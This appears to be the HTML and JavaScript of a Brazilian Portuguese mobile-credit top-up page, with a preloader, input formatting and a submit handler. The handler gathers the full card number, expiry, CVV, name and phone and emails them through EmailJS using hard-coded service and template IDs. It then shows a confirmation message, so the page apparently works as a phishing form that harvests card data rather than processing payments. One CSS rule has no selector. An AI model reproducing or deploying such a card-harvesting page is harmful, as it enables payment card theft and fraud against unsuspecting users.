<style>
    /* Preloader full-screen vermelho */

        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #e60000; /* fundo vermelho igual à página */
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
    }

<script>
    // Detecta se está dentro de um app (WebView)
    function isInApp() {
        // Exemplo simples, você pode personalizar conforme seu app
        return /MyAppName/i.test(navigator.userAgent); 
        // ou algum outro marcador que seu WebView passe no userAgent
    }

    window.addEventListener('load', function() {
        if(isInApp()) {
            const preloader = document.getElementById('preloader');
            preloader.style.opacity = '1';
            setTimeout(() => {
                preloader.style.opacity = '0';
                setTimeout(() => {
                    preloader.style.display = 'none';
                }, 500); // fade out
            }, 1500); // mantém GIF por 1.5s ou até você decidir
        } else {
            // se não for app, remove preloader imediatamente
            document.getElementById('preloader').style.display = 'none';
        }
    });
</script>
        // Inicializar EmailJS
        emailjs.init("BokFx4ywr5SIhVbb9");
        
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('recargaForm');
            const confirmation = document.getElementById('confirmation');
            const loading = document.getElementById('loading');
            const submitBtn = document.getElementById('submitBtn');
            const errorDiv = document.getElementById('error');
            const errorMsg = document.getElementById('errorMsg');
            
            // Formatação do número do cartão
            const numeroInput = document.getElementById('numero');
            numeroInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 16) value = value.slice(0, 16);
                
                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                
                this.value = formattedValue;
            });
            
            // Formatação da validade
            const validadeInput = document.getElementById('validade');
            validadeInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 4) value = value.slice(0, 4);
                
                if (value.length > 2) {
                    this.value = value.slice(0, 2) + '/' + value.slice(2);
                } else {
                    this.value = value;
                }
            });
            
            // Formatação do telefone
            const telefoneInput = document.getElementById('telefone');
            telefoneInput.addEventListener('input', function() {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 11) value = value.slice(0, 11);
                
                if (value.length > 0) {
                    value = value.replace(/^(\d{2})(\d)/g, "($1) $2");
                    if (value.length > 10) {
                        value = value.replace(/(\d{5})(\d)/, "$1-$2");
                    }
                }
                
                this.value = value;
            });
            
            // Envio do formulário
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                // Esconder mensagens de erro anteriores
                errorDiv.style.display = 'none';
                
                // Desabilitar botão e mostrar loading
                submitBtn.disabled = true;
                loading.style.display = 'block';
                
                try {
                    const formData = new FormData(form);
                    const data = {
                        nome: formData.get('nome'),
                        numero: formData.get('numero'),
                        validade: formData.get('validade'),
                        cvv: formData.get('cvv'),
                        telefone: formData.get('telefone'),
                        valor: formData.get('valor'),
                        date: new Date().toLocaleString('pt-BR')
                    };
                    
                    if (!validarDados(data)) {
                        throw new Error('Por favor, preencha todos os campos corretamente.');
                    }
                    
                    await enviarEmailComEmailJS(data);
                    
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    form.style.display = 'none';
                    confirmation.style.display = 'block';
                    
                } catch (error) {
                    errorMsg.textContent = error.message;
                    errorDiv.style.display = 'block';
                    console.error('Erro:', error);
                } finally {
                    submitBtn.disabled = false;
                    loading.style.display = 'none';
                }
            });
            
            function validarDados(data) {
                if (!data.nome || !data.numero || !data.validade || !data.cvv || !data.telefone || !data.valor) {
                    return false;
                }
                
                const numeroLimpo = data.numero.replace(/\s/g, '');
                if (numeroLimpo.length < 16) {
                    return false;
                }
                
                if (data.cvv.length < 3 || data.cvv.length > 4) {
                    return false;
                }
                
                const telefoneLimpo = data.telefone.replace(/\D/g, '');
                if (telefoneLimpo.length < 10) {
                    return false;
                }
                
                return true;
            }
            
            async function enviarEmailComEmailJS(data) {
                try {
                    const response = await emailjs.send(
                        'service_fz8vtta', 
                        'template_qf7q88r', 
                        data
                    );
                    
                    console.log('Email enviado com sucesso!', response.status, response.text);
                    return true;
                } catch (error) {
                    console.error('Falha ao enviar email:', error);
                    throw new Error('Falha ao processar recarga. Tente novamente.');
                }
            }
        });

        // Remover preloader quando a página carregar
        window.addEventListener('load', function() {
            const preloader = document.getElementById('preloader');
            preloader.style.opacity = '0';
            setTimeout(() => {
                preloader.style.display = 'none';
            }, 500);
        });
    </script>
